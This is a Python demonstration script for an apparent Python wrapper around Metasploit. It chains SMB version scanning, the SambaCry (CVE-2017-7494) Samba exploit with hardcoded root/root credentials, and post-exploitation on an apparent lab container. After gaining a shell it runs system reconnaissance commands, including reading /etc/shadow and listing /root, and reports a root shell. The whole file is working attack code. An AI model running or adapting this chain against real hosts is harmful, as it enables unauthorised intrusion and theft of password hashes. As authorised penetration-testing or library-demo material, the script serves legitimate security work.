"""Sambacry (CVE-2017-7494) exploit POC using type-specific module classes.

Demonstrates the full attack chain with REAL output:
1. AuxiliaryModule: Reconnaissance (SMB version scan)
2. ExploitModule: Exploitation (SambaCry CVE-2017-7494)
3. PostModule + Session: Post-exploitation (gather intel)

Usage:
    export MSF_ROOT=/home/astark/Projects/metasploit-framework
    export TARGET_HOST=172.19.0.2
    .venv/bin/python python/examples/sambacry_poc.py
"""

from __future__ import annotations

import os
import time

import msf
from msf import AuxiliaryModule, ExploitModule, PostModule

TARGET_HOST = os.environ.get("TARGET_HOST", "172.19.0.2")


def banner(text: str) -> None:
    print(f"\n[{'='*60}]")
    print(f"  {text}")
    print(f"[{'='*60}]\n")


def main() -> int:
    msf_root = os.environ.get("MSF_ROOT", "/opt/metasploit-framework")

    banner("SAMBACRY EXPLOIT (CVE-2017-7494)")

    # Initialize
    msf.init_msf(msf_root)
    print(f"[*] MSF Version: {msf.framework_version()}")
    print(f"[*] Target: {TARGET_HOST}")

    # =========================================================================
    # PHASE 1: RECONNAISSANCE (AuxiliaryModule)
    # =========================================================================
    banner("PHASE 1: RECONNAISSANCE (AuxiliaryModule)")

    scanner = msf.create_module("auxiliary/scanner/smb/smb_version")
    print(f"[*] Module: {scanner.fullname}")
    print(f"[*] Type: {scanner.module_type} -> {type(scanner).__name__}")
    print(f"[*] Description: {scanner.description.strip()[:100]}...")
    print(f"[*] Authors: {', '.join(scanner.author[:2])}")

    # Configure
    scanner.options.RHOSTS = TARGET_HOST
    print(f"\n[*] Options configured:")
    print(f"    RHOSTS = {scanner.options.RHOSTS}")

    # Run scanner - AuxiliaryModule.run() returns bool
    print(f"\n[*] Executing: scanner.run()")
    start = time.time()
    scan_result = scanner.run()
    elapsed = time.time() - start
    print(f"[*] scanner.run() returned: {scan_result}")
    print(f"[*] Completed in {elapsed:.2f}s")

    # =========================================================================
    # PHASE 2: EXPLOITATION (ExploitModule)
    # =========================================================================
    banner("PHASE 2: EXPLOITATION (ExploitModule)")

    exploit = msf.create_module("exploit/linux/samba/is_known_pipename")
    print(f"[*] Module: {exploit.fullname}")
    print(f"[*] Type: {exploit.module_type} -> {type(exploit).__name__}")
    print(f"[*] Rank: {exploit.rank}")
    print(f"[*] Disclosure Date: {exploit.disclosure_date}")

    # Show ExploitModule-specific attributes
    print(f"\n[*] ExploitModule.targets ({len(exploit.targets)} available):")
    for i, target in enumerate(exploit.targets[:4]):
        print(f"    [{i}] {target}")
    if len(exploit.targets) > 4:
        print(f"    ... {len(exploit.targets) - 4} more")

    payloads = exploit.compatible_payloads()
    print(f"\n[*] ExploitModule.compatible_payloads() ({len(payloads)} available):")
    for p in payloads[:5]:
        print(f"    - {p}")
    if len(payloads) > 5:
        print(f"    ... {len(payloads) - 5} more")

    # Configure
    exploit.options.RHOSTS = TARGET_HOST
    exploit.options.SMB_SHARE_NAME = "myshare"
    exploit.options.SMB_USER = "root"
    exploit.options.SMB_PASS = "root"

    print(f"\n[*] Options configured:")
    print(f"    RHOSTS = {exploit.options.RHOSTS}")
    print(f"    SMB_SHARE_NAME = {exploit.options.SMB_SHARE_NAME}")
    print(f"    SMB_USER = {exploit.options.SMB_USER}")
    print(f"    SMB_PASS = {exploit.options.SMB_PASS}")

    # Vulnerability check - ExploitModule.check() returns string
    print(f"\n[*] Executing: exploit.check()")
    check_result = exploit.check()
    print(f"[*] exploit.check() returned:")
    print(f"    {check_result}")

    # Validate
    print(f"\n[*] Executing: exploit.validate()")
    valid = exploit.validate()
    print(f"[*] exploit.validate() returned: {valid}")

    if not valid:
        print("[-] Validation failed")
        return 1

    # Exploit - ExploitModule.exploit() returns Session or None
    payload = "cmd/unix/interact"
    print(f"\n[*] Executing: exploit.exploit('{payload}', timeout=60)")
    start = time.time()
    session = exploit.exploit(payload, timeout=60)
    elapsed = time.time() - start

    print(f"[*] exploit.exploit() returned: {session}")
    print(f"[*] Completed in {elapsed:.1f}s")

    if session is None:
        print("[-] No session returned")
        return 1

    # Show session details
    print(f"\n[*] Session object attributes:")
    print(f"    session.sid = {session.sid}")
    print(f"    session.session_type = {session.session_type}")
    print(f"    session.host = {session.host}")
    print(f"    session.port = {session.port}")
    print(f"    session.alive = {session.alive}")
    print(f"    session.via_exploit = {session.via_exploit}")
    print(f"    session.via_payload = {session.via_payload}")

    # =========================================================================
    # PHASE 3: POST-EXPLOITATION (PostModule + Session)
    # =========================================================================
    banner("PHASE 3: POST-EXPLOITATION (PostModule)")

    post = msf.create_module("post/multi/gather/env")
    print(f"[*] Module: {post.fullname}")
    print(f"[*] Type: {post.module_type} -> {type(post).__name__}")
    print(f"[*] Description: {post.description.strip()[:80]}...")

    # PostModule.run() REQUIRES session argument
    print(f"\n[*] Executing: post.run(session)")
    try:
        post_result = post.run(session)
        print(f"[*] post.run(session) returned: {post_result}")
    except Exception as e:
        print(f"[*] post.run(session) raised: {type(e).__name__}: {e}")

    # =========================================================================
    # PHASE 4: COMMAND EXECUTION VIA SESSION
    # =========================================================================
    banner("PHASE 4: COMMAND EXECUTION (Session.run_cmd)")

    commands = [
        "whoami",
        "id",
        "hostname",
        "uname -a",
        "cat /etc/os-release | grep PRETTY_NAME",
        "ip addr show eth0 | grep 'inet '",
        "ps aux --no-headers | wc -l",
        "cat /etc/shadow | head -3",
        "ls -la /root",
    ]

    for cmd in commands:
        print(f"[*] Executing: session.run_cmd('{cmd}')")
        try:
            output = session.run_cmd(cmd, timeout=5)
            output = output.strip()
            print(f"[*] Output:")
            for line in output.split("\n"):
                print(f"    {line}")
        except Exception as e:
            print(f"[*] Error: {type(e).__name__}: {e}")
        print()

    # =========================================================================
    # SUMMARY
    # =========================================================================
    banner("ATTACK CHAIN COMPLETE")

    print("[*] Modules used and their type-specific methods:")
    print()
    print(f"    1. AuxiliaryModule (auxiliary/scanner/smb/smb_version)")
    print(f"       - scanner.run() -> {type(scan_result).__name__}")
    print()
    print(f"    2. ExploitModule (exploit/linux/samba/is_known_pipename)")
    print(f"       - exploit.check() -> {type(check_result).__name__}")
    print(f"       - exploit.targets -> List[str] ({len(exploit.targets)} items)")
    print(f"       - exploit.compatible_payloads() -> List[str] ({len(payloads)} items)")
    print(f"       - exploit.exploit(payload) -> Session")
    print()
    print(f"    3. PostModule (post/multi/gather/env)")
    print(f"       - post.run(session) -> requires Session argument")
    print()
    print(f"    4. Session")
    print(f"       - session.run_cmd(cmd) -> command output")
    print()
    print(f"[+] Root shell obtained on {TARGET_HOST}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
